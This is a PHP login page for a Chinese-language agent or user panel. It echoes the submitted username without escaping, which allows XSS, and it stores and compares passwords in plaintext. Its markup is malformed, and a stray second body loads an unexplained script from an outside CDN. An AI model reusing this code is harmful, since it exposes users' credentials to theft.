<?php
/**
 * 代理登录
**/
@header('Content-Type: text/html; charset=UTF-8');
include("../includes/common.php");
?>
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title><?php echo $conf["title"] ?> - 用户登陆</title>
<link rel="icon" href="../assets/LightYear/favicon.ico" type="image/ico">
<meta name="author" content="yinqi">
<link href="../assets/LightYear/css/bootstrap.min.css" rel="stylesheet">
<link href="../assets/LightYear/css/materialdesignicons.min.css" rel="stylesheet">
<link href="../assets/LightYear/css/style.min.css" rel="stylesheet">
<style>
.lyear-wrapper {
    position: relative;
}
.lyear-login {
    display: flex !important;
    min-height: 100vh;
    align-items: center !important;
    justify-content: center !important;
}
.login-center {
    background: #fff;
    min-width: 38.25rem;
    padding: 2.14286em 3.57143em;
    border-radius: 5px;
    margin: 2.85714em 0;
}
.login-header {
    margin-bottom: 1.5rem !important;
}
.login-center .has-feedback.feedback-left .form-control {
    padding-left: 38px;
    padding-right: 12px;
}
.login-center .has-feedback.feedback-left .form-control-feedback {
    left: 0;
    right: auto;
    width: 38px;
    height: 38px;
    line-height: 38px;
    z-index: 4;
    color: #dcdcdc;
}
.login-center .has-feedback.feedback-left.row .form-control-feedback {
    left: 15px;
}
</style>
</head>
  
<body>
<div class="row lyear-wrapper">
  <div class="lyear-login">
    <div class="login-center">
      <div class="login-header text-center">
      <h1>用户登陆</h3>
      </div>
       <form action="./login.php" method="POST" role="form" class="form-horizontal">
        <div class="form-group has-feedback feedback-left">
          <input type="text" name="user" value="<?php echo @$_POST['user']?>" placeholder="请输入用户名称" class="form-control"/>
          <span class="mdi mdi-account form-control-feedback" aria-hidden="true"></span>
        </div>
        <div class="form-group has-feedback feedback-left">
          <input type="password" name="pass" placeholder="请输入用户密码" class="form-control"/>
          <span class="mdi mdi-lock form-control-feedback" aria-hidden="true"></span>
        </div>
        <div class="form-group has-feedback feedback-left row">
          <button class="btn btn-block btn-primary"  type="submit" id="submit" name="submit">立即登录</button>
        </div>
      </form>
                <p style="text-align: right;">
                    <a href="/user/reg.php">
                        注册账号？
                    </a>
      <hr>
      <footer class="col-sm-12 text-center">
        <p class="m-b-0">Copyright © 2019 <a href=""><?php echo $conf["title"] ?></a></p>
      </footer>
</form>
<?php
if(!empty($_POST['user']) && !empty($_POST['pass'])){
   $user=daddslashes($_POST['user']);
	$pass=daddslashes($_POST['pass']);
    $rs=$DB->query("select * from user_list where user = '{$user}'");
    //
    if($res = $DB->fetch($rs)){
        if($pass == $res['pass']){
            $_SESSION['user'] = $user;
            $_SESSION['islogin'] = 1;
            $_SESSION['qq'] = $res['qq'];
            $_SESSION['zt'] = $res['sta'];
            echo "<script>alert('登陆后台管理成功！');window.location.href='./';</script>";exit;
            
        }else{
            echo "<script>window.alert('密码错误');window.location.href='./login.php'; <script>";exit;
        }
    }else{
echo "<script>window.alert('不存在的账号！');window.location.href='./login.php';</script>";exit;
    }
}elseif(isset($_GET['logout'])){
	$_SESSION['islogin'] = 0;
    echo "<script>window.alert('退出成功！');window.location.href='./login.php';</script>";exit;
}elseif($_SESSION['islogin']==1){
    echo "<script>window.alert('登陆后台管理成功！');window.location.href='./';</script>";exit;
}
?>

    </div>
  </div>
</div>
<script type="text/javascript" src="../assets/LightYear/js/jquery.min.js"></script>
<script type="text/javascript" src="../assets/LightYear/js/bootstrap.min.js"></script>
</body>
<body>
<script src="https://cdn.high-end.top/sites/www.kindseer.com/assets/js/TheMatrix.js"></script>
	</body>
</html>